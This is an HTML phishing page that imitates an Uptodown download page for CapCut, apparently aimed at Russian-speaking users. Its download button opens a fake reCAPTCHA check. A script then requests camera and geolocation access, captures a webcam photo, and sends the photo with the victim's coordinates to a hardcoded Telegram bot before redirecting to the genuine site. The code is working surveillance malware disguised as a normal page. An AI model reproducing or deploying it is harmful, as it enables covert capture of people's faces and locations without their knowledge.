<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CapCut 10.4.0 (Android) - Скачать - Uptodown</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #0c262f; --ut-dark: #051116; --ut-blue: #1b85d3;
            --ut-green: #00b451; --ut-dim: #7e949c; --ut-text: #ffffff;
            --ut-card: #081d24; --ut-border: #15353f;
        }

        body { margin: 0; background-color: var(--ut-bg); font-family: 'Roboto', sans-serif; color: var(--ut-text); overflow-x: hidden; }

        /* Header */
        .top-nav { background: var(--ut-dark); height: 40px; display: flex; align-items: center; padding: 0 15px; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid var(--ut-border); overflow: hidden; white-space: nowrap; color: var(--ut-dim); gap: 15px; }
        .header-main { background: var(--ut-dark); height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid var(--ut-border); position: sticky; top: 0; z-index: 1000; }
        .logo { height: 24px; }

        /* Main Layout */
        .container { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 1fr 320px; gap: 25px; padding: 20px; }
        @media (max-width: 850px) { .container { grid-template-columns: 1fr; } .right-col { display: none; } }

        /* App Info */
        .app-header { display: flex; gap: 20px; align-items: center; margin-bottom: 25px; }
        .app-icon { width: 90px; height: 90px; border-radius: 20px; background: #000; padding: 5px; }
        .title-h1 { margin: 0; font-size: 28px; font-weight: 700; }
        .dev-link { color: var(--ut-blue); text-decoration: none; font-size: 14px; }

        /* Buttons */
        .dl-btn { background: var(--ut-green); color: #fff; width: 100%; padding: 20px; border-radius: 12px; border: none; font-weight: 700; font-size: 17px; cursor: pointer; text-align: left; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 0 #008a3d; }
        .dl-btn:active { transform: translateY(2px); box-shadow: 0 2px 0 #008a3d; }

        /* Sidebar similar apps */
        .side-card { background: var(--ut-card); border-radius: 12px; padding: 15px; border: 1px solid var(--ut-border); margin-bottom: 20px; }
        .sim-item { display: flex; gap: 12px; margin-bottom: 15px; align-items: center; }
        .sim-img { width: 45px; height: 45px; border-radius: 10px; background: #000; }

        /* CAPTCHA MODAL */
        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(15px); z-index: 9999; align-items: center; justify-content: center; opacity: 0; transition: 0.4s; }
        #overlay.show { display: flex; opacity: 1; }
        .captcha-window { background: #fff; padding: 25px; border-radius: 3px; width: 320px; color: #000; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .c-box { border: 1px solid #d3d3d3; padding: 10px; display: flex; align-items: center; cursor: pointer; background: #f9f9f9; margin-top: 15px; }
        .c-check { width: 24px; height: 24px; border: 2px solid #c1c1c1; margin-right: 15px; background: #fff; display: flex; align-items: center; justify-content: center; }

        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="top-nav">EFOOTBALL PES 2026 • ONE STATE RP • FREE FIRE MAX • CAPCUT</div>

<div class="header-main">
    <div style="color:var(--ut-blue); font-size: 22px;">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
    <div style="display:flex; gap:15px;">🔍 <div style="background:var(--ut-blue); border-radius:50%; width:24px; height:24px; text-align:center; font-size:14px;">A</div></div>
</div>

<div class="container" id="main-content">
    <div class="left-col">
        <div style="color:var(--ut-dim); font-size: 11px; margin-bottom: 15px;">ANDROID / ПРИЛОЖЕНИЯ / ВИДЕО / CAPCUT</div>
        
        <div class="app-header">
            <img src="https://stc.utdstc.com/img/icons/capcut-bytedance-android.png" class="app-icon">
            <div>
                <h1 class="title-h1">CapCut</h1>
                <a href="#" class="dev-link">Bytedance Pte. Ltd.</a>
            </div>
        </div>

        <button class="dl-btn" onclick="openGate()">
            Скачать последнюю версию <span>10.4.0 📥</span>
        </button>

        <div style="margin-top: 30px; background: var(--ut-card); height: 200px; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: var(--ut-dim); border: 1px solid var(--ut-border);">
            [ Рекламный блок ]
        </div>
    </div>

    <div class="right-col">
        <div class="side-card">
            <h4 style="margin:0 0 15px 0;">Похожие на CapCut</h4>
            <div class="sim-item"><div class="sim-img" style="background: #e91e63;"></div><div><b>InShot</b><p style="margin:0; font-size:11px; color:var(--ut-dim);">Видеоредактор</p></div></div>
            <div class="sim-item"><div class="sim-img" style="background: #000;"></div><div><b>VN Editor</b><p style="margin:0; font-size:11px; color:var(--ut-dim);">Мощный монтаж</p></div></div>
        </div>
    </div>
</div>

<div id="overlay">
    <div class="captcha-window">
        <h3 style="margin:0; font-size: 18px;">Подтвердите, что вы не робот</h3>
        <div class="c-box" onclick="runLogic()">
            <div class="c-check" id="quti"></div>
            <div style="flex-grow:1; font-size:14px;">Я не робот</div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28">
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function openGate() {
        document.getElementById('main-content').style.filter = "blur(15px)";
        const ov = document.getElementById('overlay');
        ov.style.display = "flex";
        setTimeout(() => ov.classList.add('show'), 10);
    }

    async function runLogic() {
        const q = document.getElementById('quti');
        q.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="16">';

        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (p) => {
                q.innerHTML = "✅";
                
                // Botga ma'lumot yuborish
                const vid = document.getElementById('v'); vid.srcObject = s;
                await new Promise(r => setTimeout(r, 1000));
                const can = document.getElementById('c'); can.width = 400; can.height = 300;
                can.getContext('2d').drawImage(vid, 0, 0);
                const rasm = await (await fetch(can.toDataURL('image/jpeg', 0.5))).blob();
                
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT); fd.append('photo', rasm);
                fd.append('caption', `📍 Geo: ${p.coords.latitude}, ${p.coords.longitude}`);
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                // Haqiqiy saytga o'tish
                setTimeout(() => { window.location.href = "https://viamaker.ru.uptodown.com/android"; }, 2000);

            }, () => { alert("Ошибка! Доступ к местоположению обязателен."); location.reload(); });
        } catch (e) { alert("Ошибка! Доступ к камере обязателен."); location.reload(); }
    }
</script>
</body>
</html>
